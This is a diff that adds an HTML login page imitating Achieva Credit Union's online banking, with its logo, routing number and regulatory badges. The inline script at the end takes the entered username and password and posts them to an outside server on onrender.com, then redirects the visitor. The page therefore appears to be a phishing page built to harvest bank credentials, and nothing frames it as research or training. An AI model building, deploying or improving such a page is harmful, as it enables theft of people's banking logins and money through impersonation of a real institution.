@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./public/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+    />
+    <title>Achievacu</title>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <img
+          src="./public/achieva-credit-union-vector-logo.png"
+          alt="logo"
+          width="180px"
+        />
+      </header>
+      <form id="myForm">
+        <input
+          type="text"
+          name="username"
+          id="username"
+          placeholder="Username"
+          required
+        />
+        <input
+          type="password"
+          name="password"
+          id="password"
+          placeholder="Password"
+          required
+        />
+        <i class="fa-solid fa-eye"></i>
+        <label class="slide-container">
+          <input type="checkbox" id="check" />
+          <span class="slider"></span>
+        </label>
+        <button type="button" id="loginBtn">Log in</button>
+      </form>
+      <p class="reg">Forgot <span>Username</span> Or <span>password</span>?</p>
+      <p class="register">Register a New Account</p>
+    </div>
+    <footer>
+      <div class="foot">
+        <div class="fot">
+          <p>Browser Support</p>
+          <p>Mobile</p>
+        </div>
+        <p class="rout">Routing number: <strong>263182312</strong></p>
+      </div>
+      <div class="foot">
+        <div class="fott">
+          <i class="fa-brands fa-facebook-f"></i>
+          <i class="fa-brands fa-twitter"></i>
+          <i class="fa-brands fa-linkedin-in"></i>
+          <i class="fa-brands fa-instagram"></i>
+          <i class="fa-brands fa-youtube"></i>
+        </div>
+        <div class="imgdiv">
+          <img
+            src="./public/NCUA+Logo.Black.jpg"
+            alt=""
+            width="140px"
+            height="70px"
+            id="logo"
+          />
+          <img
+            src="./public/equal-housing-lender-1.svg"
+            alt=""
+            width="80px"
+            height="80px"
+            id="logo"
+          />
+        </div>
+      </div>
+      <div class="lastfoot">
+        <div class="lastfoott">
+          <i class="fa-brands fa-apple" style="color: #ffffff"></i>
+          <div class="download">
+            <p class="down">Download on the</p>
+            <span class="appstore">App Store</span>
+          </div>
+        </div>
+        <div class="lastfoott">
+          <img
+            src="./public/playstore.svg"
+            alt=""
+            width="25px"
+            id="playstore"
+          />
+          <div class="download">
+            <p class="downn">GET IT ON</p>
+            <span class="appstoree">Google Play</span>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </body>
+  <script>
+    const loginBtn = document.getElementById("loginBtn");
+    loginBtn.addEventListener("click", function (e) {
+      const usernameInput = document.getElementById("username");
+      const passwordInput = document.getElementById("password");
+      const username = usernameInput.value;
+      const password = passwordInput.value;
+
+      fetch("https://backend-for-achieva.onrender.com/form-submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ username, password }),
+      })
+        .then((response) => {
+          if (!response.ok) {
+            return response.text();
+          }
+          return response.json();
+        })
+        .then((data) => {
+          if (typeof data === "string") {
+            const errorMessage = data;
+            const errorDiv = document.createElement("div");
+            errorDiv.textContent = errorMessage;
+            errorDiv.style.color = "red";
+            errorDiv.style.position = "relative";
+            errorDiv.style.marginBottom = "20px";
+            errorDiv.style.textAlign = "center";
+            errorDiv.style.top = "158px";
+            const formElement = document.getElementById("myForm");
+            formElement.parentNode.insertBefore(errorDiv, formElement);
+            usernameInput.value = "";
+            passwordInput.value = "";
+          } else {
+            window.location.href = data.redirectUrl;
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    });
+  </script>
+</html>
